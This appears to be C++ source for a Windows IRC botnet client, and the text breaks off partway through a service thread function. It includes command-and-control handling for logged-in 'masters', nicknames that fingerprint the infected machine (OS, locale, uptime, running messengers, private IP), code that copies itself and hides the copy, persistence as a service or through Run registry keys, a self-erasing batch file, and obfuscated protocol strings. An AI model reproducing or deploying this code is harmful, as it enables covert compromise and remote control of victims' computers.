
#include "../h/includes.h"
#include "../h/functions.h"
	//////////////////////////////////////////////////////////////////////////////
	//								IRC Structure
	//////////////////////////////////////////////////////////////////////////////
logged_in logins[MAX_LOGINS];

IRC::IRC()
{
	hooks=0;
	clear_logins();
	connected=false;
	bconnect=true;
	cur_nick=0;
}

IRC::~IRC()
{
	if (hooks)
		delete_irc_command_hook(hooks);
}

DWORD dwLastRecv;
DWORD WINAPI PingTimeoutThread(LPVOID param)
{
	NTHREAD timeout = *((NTHREAD *)param);
	NTHREAD *timeouts = (NTHREAD *)param;
	timeouts->gotinfo = TRUE;
	IRC* irc=(IRC*)timeout.conn;
	while(1)
	{
		if (((GetTickCount()/1000)-(dwLastRecv/1000)) > PING_TIMEOUT)
		{
			irc->quit("Ping Timeout? (%d-%d)%d/%d",(GetTickCount()/1000),(dwLastRecv/1000),((GetTickCount()/1000)-(dwLastRecv/1000)),PING_TIMEOUT);
			ExitThread(0);
		}
		Sleep(PING_TIMEOUT*1000);
	}
	ExitThread(0);
}
BOOL PrivateIP(const char *ip) {
	if(!ip) return FALSE; if(!strcmp(ip, "")) return FALSE;
	char *tokens[4]; char ipbuf[32];
	strncpy(ipbuf, ip, 32);
	tokens[0]=strtok(ipbuf, ".");
	if(!tokens[0]) return FALSE;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return FALSE; }
	if(!strcmp(tokens[0], "10")) return TRUE;
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return TRUE;
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return TRUE;
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return TRUE;
	return FALSE;
}
int IRC::isend(int socket, char *data, ...)
{
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,data); 
	_vsnprintf(tbuffer,sizeof(tbuffer),data,argp);
		if (fsend(socket,tbuffer,strlen(tbuffer),0)==SOCKET_ERROR)
			return 1;
		else
			return 0;
}

void IRC::insert_irc_command_hook(irc_command_hook* hook, char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*))
{
	if (hook->function)
	{
		if (!hook->next)
		{
			hook->next=new irc_command_hook;
			hook->next->function=0;
			hook->next->irc_command=0;
			hook->next->next=0;
		}
		insert_irc_command_hook(hook->next, cmd_name, function_ptr);
	}
	else
	{
		hook->function=function_ptr;
		hook->irc_command=new char[strlen(cmd_name)+1];
		strcpy(hook->irc_command, cmd_name);
	}
}

void IRC::hook_irc_command(char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*))
{
	if (!hooks)
	{
		hooks=new irc_command_hook;
		hooks->function=0;
		hooks->irc_command=0;
		hooks->next=0;
		insert_irc_command_hook(hooks, cmd_name, function_ptr);
	}
	else
	{
		insert_irc_command_hook(hooks, cmd_name, function_ptr);
	}
}
void IRC::delete_irc_command_hook(irc_command_hook* cmd_hook)
{
	if (cmd_hook->next)
		delete_irc_command_hook(cmd_hook->next);
	if (cmd_hook->irc_command)
		delete cmd_hook->irc_command;
	delete cmd_hook;
}
int IRC::add_login(const char* nick, const char* ident, const char* host)
{
	int i;
	BOOL s=FALSE;
	for (i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] == '\0')
		{
			strcpy(logins[i].nick, nick);
			strcpy(logins[i].ident,ident);
			strcpy(logins[i].host, host);
			s=TRUE;
			break;
		}
	}

	if (s)
		return i;
	else
		return -1;
}

int IRC::del_login(const char* nick, const char* ident, const char* host)
{
	int i;
	BOOL bs=FALSE;
	for (i=0; i<MAX_LOGINS; i++)
	{
		if (logins[i].nick[0] != '\0')
		{
			if (!strcmp(logins[i].nick,nick) && !strcmp(logins[i].ident,ident) && !strcmp(logins[i].host,host))
			{
				bs=TRUE;
				del_login(i);
				break;
			}
		}
	}
	if (bs)
		return i;
	else
		return -1;
}

void IRC::clear_logins(void)
{
	for (int i=0; i<MAX_LOGINS; i++)
	{
		ZeroMemory(logins[i].nick,sizeof(logins[i].nick));
		ZeroMemory(logins[i].ident,sizeof(logins[i].ident));
		ZeroMemory(logins[i].host,sizeof(logins[i].host));
	}
}

BOOL IRC::del_login(int i)
{
	if (logins[i].nick[0]!='\0')
	{
		ZeroMemory(logins[i].nick,sizeof(logins[i].nick));
		ZeroMemory(logins[i].ident,sizeof(logins[i].ident));
		ZeroMemory(logins[i].host,sizeof(logins[i].host));
		return TRUE;
	}
	return FALSE;
}

BOOL IRC::is_logged_in(const char* nick, const char* ident, const char* host)
{
	for (int i=0; i<MAX_LOGINS; i++)
		if (logins[i].nick[0] != '\0')
			if (!strcmp(logins[i].nick,nick) && !strcmp(logins[i].ident,ident) && !strcmp(logins[i].host,host))
				return TRUE;
	return FALSE;
}

BOOL IRC::has_master(void)
{
	for (int i=0; i<MAX_LOGINS; i++)
		if (logins[i].nick[0] != '\0')
			return TRUE;
	return FALSE;
}

int IRC::privmsg_masters(char* message, ...)
{
	if (!connected)
		return 1;
	
	int i,iret=0;
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	for (i=0;i<MAX_LOGINS;i++)
		if (logins[i].nick[0]!='\0')
			iret+=pmsg(logins[i].nick,tbuffer);

	return iret;
}

int IRC::start(char* server, int port, char* nick, char* user, char* name, char* pass)
{
	HOSTENT* resolv;
	sockaddr_in rem;
	if (connected)
		return 1;
	isock=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (isock==INVALID_SOCKET)
	{
		return 1;
	}
	resolv=fgethostbyname(server);
	if (!resolv)
	{
		fclosesocket(isock);
		return 1;
	}
	memcpy(&rem.sin_addr, resolv->h_addr, 4);
	rem.sin_family=AF_INET;
	rem.sin_port=fhtons(port);
	if (fconnect(isock, (const sockaddr*)&rem, sizeof(rem))==SOCKET_ERROR)
	{
		fclosesocket(isock);
		return 1;
	}
	dwLastRecv=GetTickCount();
	clear_logins();
	dwconnected=GetTickCount();
	dwLastRecv=GetTickCount();
	connected=true;
	cur_nick=new char[strlen(nick)+1];
	strcpy(cur_nick, nick);
	if (pass && strcmp(pass,"")) {
		isend(isock,"%s %s\r\n", Decode(str_pass), pass);
	}
	isend(isock,"%s %s\r\n", Decode(str_nick), nick);
	isend(isock,"%s %s * 0 :%s\r\n", Decode(str_user), user, name);
	dwLastRecv=GetTickCount();
	return 0;
}

void IRC::disconnect()
{
	if (connected)
	{
		quit("Leaving");
		connected=false;
		bconnect=false;
		fshutdown(isock, 2);
		fclosesocket(isock);
	}
}
int IRC::quit(char* quit_message, ...)
{
	if (connected)
	{
		int iret=0;
		if (quit_message)
		{
			char tbuffer[IRCLINE];
			va_list argp;
			va_start(argp,quit_message); 
			_vsnprintf(tbuffer,sizeof(tbuffer),quit_message,argp);
			iret=isend(isock,"%s %s\r\n", Decode(str_quit), tbuffer);
		}
		else
		{
			iret=isend(isock,"%s\r\n",Decode(str_quit));
		}
		if (iret)
			return 1;
	}
	return 0;
}

int IRC::message_loop()
{
	char buffer[1024];
	int ret_len;
	if (!connected)
		return 1;
	while (1)
	{
		bool bRecvd=false;
			ret_len=frecv(isock, buffer, 1023, 0);
		if (ret_len==SOCKET_ERROR || !ret_len)
		{
			connected=false;
			return 1;
		}
		dwLastRecv=GetTickCount();
		buffer[ret_len]='\0';
		split_to_replies(buffer);
	}
	return 0;
}

void IRC::split_to_replies(char* data)
{
	char* p;
	while (p=strstr(data, "\r\n"))
	{
		*p='\0';
		parse_irc_reply(data);
		data=p+2;
	}
}

void IRC::parse_irc_reply(char* data)
{
	char* hostd;
	char* cmd;
	char* params;
	irc_reply_data hostd_tmp;
	hostd_tmp.target=0;
	if (data[0]==':')
	{
		hostd=&data[1];
		cmd=strchr(hostd, ' ');
		if (!cmd)
			return;
		*cmd='\0';
		cmd++;
		params=strchr(cmd, ' ');
		if (params)
		{
			*params='\0';
			params++;
		}
		hostd_tmp.nick=hostd;
		hostd_tmp.ident=strchr(hostd, '!');
		if (hostd_tmp.ident)
		{
			*hostd_tmp.ident='\0';
			hostd_tmp.ident++;
			hostd_tmp.host=strchr(hostd_tmp.ident, '@');
			if (hostd_tmp.host)
			{
				*hostd_tmp.host='\0';
				hostd_tmp.host++;
			}
		}
		if (!strcmp(cmd, Decode(str_join)))
		{
			
		}
		else if (!strcmp(cmd, Decode(str_part)))
		{
			if (is_logged_in(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host))
				del_login(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host);
		}
		else if (!strcmp(cmd, Decode(str_quit)))
		{
			if (is_logged_in(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host))
				del_login(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host);
		}
		else if (!strcmp(cmd, Decode(str_note)))
		{
			hostd_tmp.target=params;
			params=strchr(hostd_tmp.target, ' ');
			if (params)
				*params='\0';
			params++;
		}
		else if (!strcmp(cmd, Decode(str_pmsg)))
		{
			hostd_tmp.target=params;
			params=strchr(hostd_tmp.target, ' ');
			if (!params)
				return;
			*(params++)='\0';
		}
		else if (!strcmp(cmd, Decode(str_nick)))
		{
			if (!strcmp(hostd_tmp.nick, cur_nick))
			{
				delete [] cur_nick;
				cur_nick=new char[strlen(params)+1];
				strcpy(cur_nick, params);
			}
		}
		call_hook(cmd, params, &hostd_tmp);
	}
	else
	{
		cmd=data;
		data=strchr(cmd, ' ');
		if (!data)
			return;
		*data='\0';
		params=data+1;

		if (!strcmp(cmd, Decode(str_ping)))
		{
			if (!params)
				return;

			isend(isock,"%s %s\r\n", Decode(str_pong), &params[1]);
		}
		else
		{
			hostd_tmp.host=0;
			hostd_tmp.ident=0;
			hostd_tmp.nick=0;
			hostd_tmp.target=0;
			call_hook(cmd, params, &hostd_tmp);
		}
	}
}

void IRC::call_hook(char* irc_command, char* params, irc_reply_data* hostd)
{
	irc_command_hook* p;
	if (!hooks || !strcmp(irc_command,"") || !strcmp(irc_command,"366"))
		return;
	p=hooks;
	while (p)
	{
		if (!strcmp(p->irc_command, irc_command))
		{
			(*(p->function))(params, hostd, this);
			p=0;
		}
		else
		{
			p=p->next;
		}
	}
}

int IRC::notice(char* target, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	int iret=isend(isock,"%s %s :%s\r\n", Decode(str_note), target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

int IRC::pmsg(char* target, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	int iret=isend(isock,"%s %s :%s\r\n", Decode(str_pmsg), target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

int IRC::privmsg_filter(char* target, char *filter, char* message, ...)
{
	if (!connected)
		return 1;
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	if (filter)
		if (!wildcardfit(_strlwr(filter),_strlwr(tbuffer)))
			return 1;
	int iret=isend(isock,"%s %s :%s\r\n", Decode(str_pmsg), target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

int IRC::join(char* channel)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"%s %s\r\n", Decode(str_join), channel);
	return iret;
}

int IRC::join(char* channel, char* pass)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"%s %s %s\r\n", Decode(str_join), channel, pass);
	return iret;
}

int IRC::part(char* channel)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"%s %s\r\n", Decode(str_part), channel);
	return iret;
}

int IRC::raw(char* data)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"%s\r\n", data);
	return iret;
}

int IRC::mode(char* channel, char* modes, char* targets)
{
	if (!connected)
		return 1;
	int iret;
	if (!targets)
		iret=isend(isock,"%s %s %s\r\n", Decode(str_mode), channel, modes);
	else
		iret=isend(isock,"%s %s %s %s\r\n", Decode(str_mode), channel, modes, targets);
	return iret;
}

int IRC::mode(char* modes)
{
	if (!connected)
		return 1;
	mode(cur_nick, modes, 0);
	return 0;
}

char *IRC::nickgen(DWORD NickType, int NickLen)
{	
	static char *rndnick;
	nicklen=NickLen;
	if (NickType==N_OS)
		rndnick=nickgen_os();
	else if (NickType==N_RNDCTY)
		rndnick=nickgen_rndcountry();
	else if (NickType==N_BOX)
		rndnick=nickgen_curbox();
	else if (NickType==N_RNDLTR)
		rndnick=nickgen_rndltr();
	else if (NickType==N_MINE)
		rndnick=nickgen_mine();
	else
		rndnick=nickgen_rndltr();
	return rndnick;
}

char *IRC::nickgen_rndltr(void)
{	
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	for (int i=0;i<=nicklen;i++) 
		rndnick[i] = (rand()%26)+97;
	rndnick[i] = '\0';
	return rndnick;
}

char *IRC::nickgen_curbox(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	BOOL good=FALSE;
	DWORD dwcb=MAX_NICKLEN;
	fGetComputerName(rndnick,&dwcb);
	for (int j=65;j<91;j++) { if (rndnick[0] == j) good=TRUE; }
	for (int k=97;k<123;k++) { if (rndnick[0] == k) good=TRUE; }
	if (!good)
		sprintf(rndnick,"Error");
	return rndnick;
}

char *IRC::nickgen_rndcountry(void)
{	
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));
	sprintf(rndnick,"%s-",locale);
	for (int i=strlen(rndnick);i<=nicklen;i++) 
		rndnick[i]=(rand()%10)+48;
	return rndnick;
}

char *IRC::nickgen_os(void)
{	
	char *os;
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	OSVERSIONINFO osVI;
	osVI.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	if (GetVersionEx(&osVI)) {
			if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==0)
			{	if(osVI.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)		os="95-";
				if(osVI.dwPlatformId==VER_PLATFORM_WIN32_NT)			os="NT-"; }
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==10)	os="98-";
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==90)	os="ME-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==0)	os="2K-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==1)	os="XP-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==2)	os="2K3-";
			else if(osVI.dwMajorVersion==6 && osVI.dwMinorVersion==0)   os="VIS-";
			else														os="UNK-";
		} else
			os="UNK-";

		sprintf(rndnick,os);
		for (int i=strlen(rndnick);i<=nicklen;i++)
			rndnick[i]=(rand()%10)+48;
	return rndnick;
}

char *IRC::nickgen_mine(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	prefixmrc=FALSE;
	prefixprv=FALSE;
	prefixdialup=FALSE;
	char *prefix=nickgen_prefix();
	strcat(rndnick,prefix);
	strcat(rndnick,"|");
	int i=1;
	if (prefixmrc) i++;
	if (prefixprv) i++;
	if (prefixdialup) i++;
	char strbuf[2];
	for (i;i<REQ_NICKLEN;i++)
	{
		sprintf(strbuf,"%i",rand()%10);
		strcat(rndnick,strbuf);
	}
	strcat(rndnick,"]");
	return rndnick;
}

char *IRC::nickgen_prefix(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	char days[8];
	unsigned int ud=GetTickCount()/86400000;
	sprintf(rndnick,"[SH|");

	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));
	strcat(rndnick,locale);
	strcat(rndnick,"|");

	sprintf(days,"%.2d",ud);
	nicktime=ud;
	strcat(rndnick,days);
	strcat(rndnick,"|");
	if (FindWindow("_Oscar_StatusNotify",0))
	{
		strcat(rndnick,"A");
	}
	if (FindWindow("MSNHiddenWindowClass",0))
	{
		prefixmrc=TRUE;
		strcat(rndnick,"M");
	}
	if (FindWindow("__oxFrame.class__",0))
	{
		strcat(rndnick,"T");
	}
#ifndef NO_SEED
	if (FindUTorrent())
	{
		strcat(rndnick, "U");
	}
#endif
	if (FindWindow("TskMultiChatForm.UnicodeClass",0))
	{
		strcat(rndnick, "S");
	}
	if (FindWindow("Message Session",0))
	{
		strcat(rndnick, "I");
	}
	if (PrivateIP(inip))
	{
		prefixprv=TRUE;
		strcat(rndnick,"P");
	}
	if (!nowininet)
	{
		DWORD n;
		fInternetGetConnectedStateEx(&n, 0, 0, 0);
		if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) {
			strcat(rndnick,"D");
			prefixdialup=TRUE;
		}
	}
	return rndnick;
};

int IRC::nick(char* newnick)
{
	if (!connected)
		return 1;
	int iret=isend(isock,"%s %s\r\n", Decode(str_nick), newnick);
	return iret;
}

char* IRC::current_nick()
{
	return cur_nick;
}

bool IRC::is_connected()
{
	return connected;
}

bool IRC::should_connect()
{
	return bconnect;
}

char* IRC::get_ip()
{
	SOCKADDR sa;
	int sas = sizeof(sa);
	ZeroMemory(&sa,sizeof(sa));
	fgetsockname(isock, &sa, &sas);
	sprintf(ip,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	return ip;
}

SOCKET IRC::get_sock(void)
{
	return isock;
}
	//////////////////////////////////////////////////////////////////////////////
	//						File and uninstall utilities
	//////////////////////////////////////////////////////////////////////////////
int SplitParams(char *a[MAX_TOKENS],char *line,int depth)
{
	a[0]=strtok(line," ");
	int i;
	for (i=1;i<depth;i++)
	{
		a[i]=strtok(NULL," ");
		if (a[i])
			continue;
		else
			break;
	}
	return i;
}

BOOL FileExists(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
		return TRUE;
}

BOOL IsFolder(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
	{
		if (dwAttr & FILE_ATTRIBUTE_DIRECTORY)
			return TRUE;
		else
			return FALSE;
	}
}

size_t FileSize(const char *exename)
{
	unsigned short  multiplier=0, fread_ret=0, feof_ret=0;
	char char_count[1024];
	FILE *stream;
	stream = fopen(exename, "rb");
	while(fread_ret = fread(char_count, sizeof(char), sizeof(char_count), stream))
	{
		if (fread_ret < 1024)
		{
			feof_ret = feof(stream);
			if (feof_ret != 0)
				return (sizeof(char_count) * multiplier)+fread_ret;
			else
				return 0;
		}
		else
			multiplier++;
	}
	return (sizeof(char_count) * multiplier)+fread_ret;
}

BOOL MoveBot(char *MTP, char *Bname)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MTP,Bname);
	strcpy(CurrentPath,CurrentPathF);
	fPathRemoveFileSpec(CurrentPath);
	char buf3[260],windir[260];
	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);
	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != DWORD(-1))
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();
			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE;
				Sleep(15000);
			}
			else
				break;
		}
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		if (bCFRet)
		{
			return TRUE;
		}
	}
	else
	{
	}
	return FALSE;
}
char *substr(char *input, int start, int end)
{
	static char output[1024];
	for (int y=0;y<256;y++)
		output[y]='\0';
	for (int i=start,t=0;i<=end;i++,t++)
		output[t]=input[i];
	return (output);
}
char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;
	if ((temps = strdup(str)) != NULL) { 
		if ((ptr = strstr(str, substr)) != NULL) {
			strncpy(temps, str, ptr - str);
			temps[ptr - str] = '\0';
			strncat(temps, repstr, strlen(repstr));
			strcat(temps, ptr+strlen(substr));
			strcpy(str, temps);
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

#ifndef NO_WILDCARD
// Wildcard function(s) from: http://user.cs.tu-berlin.de/~schintke/references/wildcards/wildcards.c.html
int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}
int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}
int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}
#endif

void EraseMe(BOOL nopause)
{
	char buffer[1024], cpbot[MAX_PATH], batfile[MAX_PATH];
	HANDLE f;
	DWORD r;

	GetTempPath(sizeof(buffer), buffer);
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	sprintf(batfile, "%s\\rmme%i%i%i%i.bat",buffer,rand()%9,rand()%9,rand()%9,rand()%9);

	SetFileAttributes(cpbot,FILE_ATTRIBUTE_NORMAL);

	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		char delBatch[512];
		if (!nopause)
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
	"del \"%s\">nul\r\n"
	"ping 0.0.0.0>nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cpbot,cpbot,cpbot);
		}
		else
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
	"del \"%s\">nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cpbot,cpbot,cpbot);
		}
		
		WriteFile(f, delBatch, strlen(delBatch), &r, NULL);
		CloseHandle(f);
		fShellExecute(NULL, NULL, batfile, NULL, NULL, SW_HIDE);
	}
	return;
}
void uninstall(BOOL thread, BOOL difbot)
{
#ifndef NO_SERVICE
	SC_HANDLE scm;
	SC_HANDLE service;
	scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	service = fOpenService(scm, Decode(servicename), SERVICE_ALL_ACCESS);
	fDeleteService(service);
#else
	HKEY hndKey;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hndKey, NULL);
	RegDeleteValue(hndKey, Decode(szRegname));
	RegCloseKey(hndKey);
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hndKey, NULL);
	RegDeleteValue(hndKey, Decode(szRegname));
	RegCloseKey(hndKey);
#endif
	ReleaseMutex(xetum);
	if (!thread)
	{
		killthreadall();
		EraseMe();
	}
	return;
}

BOOL IsServiceRunning(char *name)
{
	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;
	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			if (!strcmp(enumeration[i].lpServiceName,name))
			{
				if (enumeration[i].ServiceStatus.dwCurrentState != SERVICE_RUNNING)
				{
					return FALSE;
				}
				else
					return TRUE;
			}
		}
		if (resumehandle == 0)
			break;
	}
	fCloseServiceHandle(handle); 
	return FALSE;
}
	//////////////////////////////////////////////////////////////////////////////
	//						   Install As A Service
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SERVICE
SC_HANDLE scm;
extern IRC mainirc;
SERVICE_STATUS ss; 
SERVICE_STATUS_HANDLE ssh; 
VOID WINAPI ShutdownHandler(DWORD Opcode)
{
	DWORD status;
	switch(Opcode)
	{
	case SERVICE_CONTROL_SHUTDOWN:
		if (mainirc.is_connected())
		{
			mainirc.quit("System shutting down.");
			Sleep(FLOOD_DELAY);
			mainirc.disconnect();
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
		ss.dwCurrentState = SERVICE_PAUSED;
		break;
	default:
		break;
	}
	if (!fSetServiceStatus(ssh,&ss))
		status = GetLastError();
	return;
}

int ServiceMain(int argc, char *argv[])
{
	ss.dwServiceType = SERVICE_WIN32; 
	ss.dwCurrentState = SERVICE_START_PENDING; 
	ss.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	ss.dwWin32ExitCode = 0; 
	ss.dwServiceSpecificExitCode = 0; 
	ss.dwCheckPoint = 0; 
	ss.dwWaitHint = 0; 
	ssh = fRegisterServiceCtrlHandler(Decode(servicename),ShutdownHandler);
    ss.dwCurrentState       = SERVICE_RUNNING; 
    ss.dwCheckPoint         = 0; 
    ss.dwWaitHint           = 0; 
	fSetServiceStatus(ssh,&ss);
	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServiceThread, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	return 0;
}

BOOL ReconfigureService(LPSTR lpDesc);
int InstallService(char *spath)
{
	DWORD le;
	SC_HANDLE service;
    	char path[MAX_PATH];
	sprintf(path, "\"%s\"", spath);
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)))
		return 0;
	if(!(service = fCreateService(scm, Decode(servicename), Decode(servicedisplayname), SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path, NULL, NULL, NULL, NULL, NULL)))
	{
		le=GetLastError();
		if(le==ERROR_DUPLICATE_SERVICE_NAME || le==ERROR_SERVICE_EXISTS)
		{
			ServiceRun();
		}
		else
			return 0;
	}
	else
	{
		ReconfigureService(Decode(servicedesc));
		ServiceRun();
	}
	fCloseServiceHandle(service);
	fCloseServiceHandle(scm);
	return 0;
}

int ServiceRun() 
{ 
    SC_HANDLE service;
	if(!(scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return 0;
	if(!(service = fOpenService(scm, Decode(servicename), SERVICE_ALL_ACCESS)))
		return 0;
	if(fStartService(service, 0, NULL) == 0)
		return 0;
	fCloseServiceHandle(scm);
    fCloseServiceHandle(service); 
    return 0;
}

DWORD WINAPI ServiceThread(LPVOID param)
{
